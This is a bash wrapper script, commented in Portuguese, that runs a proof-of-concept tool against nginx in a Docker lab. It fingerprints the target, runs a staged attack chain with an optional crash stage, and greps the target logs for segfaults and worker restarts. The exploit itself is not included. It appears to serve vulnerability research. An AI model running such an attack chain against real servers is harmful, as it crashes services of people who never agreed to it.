#!/usr/bin/env bash
# Executa o PoC dentro do container atacante e mostra o log do alvo.
#
#   ./scripts/attack.sh                 # cadeia completa + estagio de crash
#   ./scripts/attack.sh --no-accelerate # para no estagio 6 (sem crash)
#   ./scripts/attack.sh --probe         # apenas fingerprint
set -uo pipefail

cd "$(dirname "$0")/.."

if [ "${1:-}" = "--probe" ]; then
    shift
    docker compose exec -T attacker ./n2r probe --host target "$@"
    exit $?
fi

rc=0
if [ "${1:-}" = "--no-accelerate" ]; then
    shift
    docker compose exec -T attacker ./n2r run --host target "$@" || rc=$?
else
    docker compose exec -T attacker ./n2r run --host target --accelerate "$@" || rc=$?
fi

echo
echo "────────────────────────── log do alvo ──────────────────────────"
docker compose logs --no-log-prefix --tail=400 target \
    | grep -aE '\[n2r\]|exited on signal|start worker process|signal 11' \
    | tail -n 24 \
    | sed -E 's/(\[n2r\])/\x1b[38;5;221m\1\x1b[0m/; s/(exited on signal.*|signal 11.*)/\x1b[38;5;203m\1\x1b[0m/'
echo "─────────────────────────────────────────────────────────────────"

state="$(docker inspect -f '{{.State.Status}} exit={{.State.ExitCode}}' n2r-target 2>/dev/null || true)"
if [ -n "$state" ]; then
    echo "estado do alvo: $state"
    if docker inspect -f '{{.State.Status}}' n2r-target 2>/dev/null | grep -qx exited; then
        echo "o container do alvo parou: o processo do nginx morreu de verdade."
    else
        echo "o container continua de pe porque o master reiniciou o worker."
        echo "suba com N2R_SINGLE=1 para o alvo cair (padrao do compose)."
    fi
fi

exit "$rc"
